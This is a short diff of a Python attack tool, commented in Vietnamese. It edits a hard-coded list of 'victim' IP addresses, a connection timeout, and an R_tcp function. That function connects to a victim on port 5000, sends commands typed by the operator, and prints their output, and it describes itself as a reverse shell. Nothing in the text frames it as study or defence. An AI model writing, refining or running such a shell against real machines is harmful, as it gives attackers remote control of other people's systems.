@@ -10,7 +10,7 @@ import numpy as np
 import socket, argparse, sys, threading, os
 
 # Danh sách các địa chỉ IP của victim
-VICTIM_IPS = ['10.10.26.53', '10.0.2.15', '10.10.26.55']
+VICTIM_IPS = ['192.168.1.2','192.168.1.5', '10.0.2.15', '10.10.26.55']
 
 #arguments parser
 def parseargs():
@@ -27,7 +27,7 @@ def check_victim_status(hosts, port):
     for host in hosts:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)  # Set timeout to 1 second
+            s.settimeout(1)  # Set timeout to 1 second
             s.connect((host, port))
             victims_status[host] = "Connected"
             s.close()
@@ -78,16 +78,25 @@ def is_port_open(host, port, timeout=5):
 
 def R_tcp(host, port=5000):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    BUFFER_SIZE = 1024
+    BUFFER_SIZE = 4096
     s.connect((host, port))
-    message = s.recv(BUFFER_SIZE).decode()
+    print(f"Connected to victim at {host}:{port}")
+    
     while True:
-        command = input("Enter the command you wanna execute:")
+        command = input("Enter the command you want to execute (or type 'exit' to disconnect): ")
         s.send(command.encode())
+        
         if command.lower() == "exit":
+            print("Exiting reverse shell...")
             break
+        
         results = s.recv(BUFFER_SIZE).decode()
-        print(results)
+        
+        if not results:
+            print("No output received.")
+        else:
+            print(results)
+    
     s.close()
 
 
